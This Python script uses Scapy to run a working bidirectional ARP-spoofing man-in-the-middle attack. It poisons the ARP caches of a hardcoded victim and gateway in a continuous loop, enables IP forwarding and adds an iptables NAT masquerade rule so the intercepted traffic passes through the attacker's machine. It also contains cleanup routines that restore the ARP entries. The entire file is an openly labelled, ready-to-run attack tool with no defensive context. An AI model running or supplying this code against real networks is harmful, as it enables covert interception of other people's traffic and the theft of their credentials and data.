import time
import os
from scapy.all import ARP, Ether, srp, sendp, conf

# Define the victim and gateway IP addresses.
VICTIM_IP = "192.168.1.10"    # Victim's IP address.
GATEWAY_IP = "192.168.1.20"    # Gateway IP address.
conf.iface = "eth0"           # Set the default interface to eth0

def get_mac(ip):
    """
    Send an ARP request to get the MAC address of the given IP.
    """
    print(f"[DEBUG] Getting MAC address for {ip}...")
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered_list = srp(packet, timeout=3, verbose=False)[0]

    if answered_list:
        mac = answered_list[0][1].hwsrc
        print(f"[DEBUG] Received MAC {mac} for IP {ip}")
        return mac
    else:
        print(f"[ERROR] No response for IP {ip}")
        return None

def spoof(target_ip, spoof_ip):
    """
    Send a spoofed ARP reply to target_ip, telling it that spoof_ip is at our MAC address.
    """
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[ERROR] Could not retrieve MAC for {target_ip}. Skipping spoof.")
        return

    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip,
                                          hwdst=target_mac, psrc=spoof_ip)
    print(f"[DEBUG] Sending spoofed ARP reply to {target_ip}: Claiming {spoof_ip} is at our MAC.")
    sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    Restore the ARP table of destination_ip by setting the correct mapping for source_ip.
    """
    print(f"[INFO] Restoring ARP table for {destination_ip}...")
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac is None or source_mac is None:
        print("[ERROR] Could not restore ARP entries due to missing MAC addresses.")
        return
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                 psrc=source_ip, hwsrc=source_mac)
    sendp(packet, count=4, verbose=False)
    print(f"[INFO] ARP table restored for {destination_ip}.")

def enable_ip_forwarding():
    """
    Enable IP forwarding so that intercepted packets are forwarded correctly.
    """
    print("[INFO] Enabling IP forwarding...")
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[DEBUG] IP forwarding enabled.")
    except Exception as e:
        print(f"[ERROR] Failed to enable IP forwarding: {e}")

def disable_ip_forwarding():
    """
    Disable IP forwarding.
    """
    print("[INFO] Disabling IP forwarding...")
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print("[DEBUG] IP forwarding disabled.")
    except Exception as e:
        print(f"[ERROR] Failed to disable IP forwarding: {e}")

def setup_iptables():
    """
    Set up iptables NAT rules to masquerade outgoing packets.
    """
    print("[INFO] Setting up iptables for NAT redirection...")
    try:
        os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
        print("[DEBUG] iptables NAT rule added.")
    except Exception as e:
        print(f"[ERROR] Failed to set up iptables: {e}")

def flush_iptables():
    """
    Flush the iptables NAT rules.
    """
    print("[INFO] Flushing iptables NAT rules...")
    try:
        os.system("iptables -t nat -F")
        print("[DEBUG] iptables NAT rules flushed.")
    except Exception as e:
        print(f"[ERROR] Failed to flush iptables rules: {e}")

def main():
    print("[INFO] Starting bidirectional ARP spoofing for a Man-in-the-Middle attack...")
    print(f"[INFO] Victim: {VICTIM_IP}, Gateway: {GATEWAY_IP}")

    # Enable packet forwarding and configure iptables for NAT.
    enable_ip_forwarding()
    setup_iptables()

    try:
        while True:
            # Spoof the victim: tell victim that gateway is at our MAC.
            spoof(VICTIM_IP, GATEWAY_IP)
            # Spoof the gateway: tell gateway that victim is at our MAC.
            spoof(GATEWAY_IP, VICTIM_IP)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[INFO] CTRL+C detected! Restoring network configuration...")
        restore(VICTIM_IP, GATEWAY_IP)
        restore(GATEWAY_IP, VICTIM_IP)
        disable_ip_forwarding()
        flush_iptables()
        print("[INFO] Exiting...")

if __name__ == "__main__":
    main()
